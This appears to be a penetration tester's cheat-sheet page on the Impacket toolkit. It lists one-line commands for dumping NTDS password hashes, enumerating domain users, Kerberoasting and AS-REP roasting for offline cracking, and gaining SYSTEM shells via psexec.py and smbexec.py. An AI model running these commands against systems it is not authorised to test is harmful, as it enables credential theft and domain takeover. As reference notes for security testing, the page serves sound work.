# Impacket

> Impacket is a collection of Python classes for working with network protocols.  
* [GitHub - SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)  
* [Fun with network protocols, using Python and Impacket | Andrea Fortuna](https://www.andreafortuna.org/2018/06/18/fun-with-network-protocols-using-python-and-impacket/)

## Related

* [Active Directoy](../11-services/03-misc/Active-Directoy.md)
* [TCP 88: Kerberos](../11-services/01-tcp/TCP-88-Kerberos.md)
* [TCP 389, 636, 3268, 3269: LDAP](../11-services/01-tcp/TCP-389-636-3268-3269-LDAP.md)

## Dump hashes

```powershell
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## Users

> This script will gather data about the domain’s users and their corresponding email addresses.  
```powershell
GetADUsers.py -all -dc-ip <ip> <domain>/<user>:<pw>
```

> This example will try to find and fetch Service Principal Names that are associated with normal user accounts.  
```powershell
GetUserSPNs.py -request <domain>/<user>:<pw> // -dc-ip <ip> 
```
-> Crack hash e.g. using hashcat, to obtain passwords

> An application that communicates with the Security Account Manager Remote interface from the MSRPC suite.  
```powershell
samrdump.py <domain>
```

> This example will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR.  
```powershell
GetNPUsers.py <domain>/<user> -no-pass
```
-> Crack hash e.g. using hashcat

## Shell (psexec.py)

> PSEXEC like functionality example using RemComSvc.  
-> Get a shell as "nt authority\system"
```powershell
sudo psexec.py [<domain>/]<user>:[<pw>]@<ip>
```

## SMB (smbexec.py)

```powershell
sudo smbexec.py <user>:<pw>@<target>
```
